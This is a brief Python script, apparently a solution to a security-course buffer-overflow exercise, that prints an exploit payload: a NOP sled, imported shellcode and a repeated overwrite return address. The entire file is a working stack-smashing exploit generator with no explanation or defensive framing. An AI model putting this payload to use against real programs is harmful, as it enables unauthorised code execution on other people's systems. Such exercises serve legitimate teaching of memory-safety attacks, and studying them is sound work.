#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x90'*497 + shellcode + pack('<I', 0xfffefa01)*500)
